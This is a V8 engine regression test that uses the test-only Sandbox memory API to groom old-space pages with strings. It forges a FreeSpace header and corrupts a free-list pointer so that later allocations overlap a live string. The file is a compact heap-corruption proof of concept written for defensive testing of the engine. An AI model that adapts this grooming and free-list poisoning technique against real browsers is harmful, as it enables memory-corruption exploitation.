// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing --expose-gc

const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const kThinStringActualOffset = Sandbox.getFieldOffset(
    Sandbox.getInstanceTypeIdFor('THIN_ONE_BYTE_STRING_TYPE'), 'actual');
const kSeqOneByteStringCharsOffset = Sandbox.getFieldOffset(
    Sandbox.getInstanceTypeIdFor('SEQ_ONE_BYTE_STRING_TYPE'), 'chars');
const kFreeSpaceNextOffset = Sandbox.getFieldOffset(
    Sandbox.getInstanceTypeIdFor('FREE_SPACE_TYPE'), 'next');
const kPageSize = 0x40000;

let serial = 1000000;
function old(size) {
  // Internalizing `s` via `s in {}` allocates an InternalizedOneByteString of
  // `size` bytes in old space and turns `s` into a ThinString pointing to it.
  // The first 12 character bytes form a fake FreeSpace header (4-byte map,
  // size_in_tagged = Smi 1521 -> 6084 bytes, next = Smi 0).
  const kFakeFreeSpaceHeader = 'xxxx\xe2\x0b\0\0\0\0\0\0';
  const kSerialLength = 7;
  const padding = size - kSeqOneByteStringCharsOffset -
      kFakeFreeSpaceHeader.length - kSerialLength;
  const s = kFakeFreeSpaceHeader + 'x'.repeat(padding) + serial++;
  s in {};
  return s;
}

const at = s =>
    mem.getUint32(Sandbox.getAddressOf(s) + kThinStringActualOffset, true) - 1;

function round(corrupt) {
  // Heap grooming: pad old space up to a page boundary, then fill two pages P
  // and A with strings so we can free specific slots on each page.
  const fill = [];
  do {
    fill.push(old(43688));
  } while (fill.length < 60 || (at(fill.at(-1)) + 43688) % kPageSize);
  const P = [65532, 65532, 65532, 59436, 6096].map(old);
  const A = [123952, 32, 123952, 32, 4000, 32, 4000, 32, 6096].map(old);
  const X = at(P[3]) + kSeqOneByteStringCharsOffset;
  const N = at(A[8]);
  P[4] = A[0] = A[2] = A[4] = A[6] = A[8] = null;
  gc();
  mem.setInt32(
      N + kFreeSpaceNextOffset, corrupt ? (X - N) / 4 << 1 : 0, true);
  [123952, 123952, 6096, 4032, 2400].forEach(old);
}
round(false);
gc();
round(true);
gc();
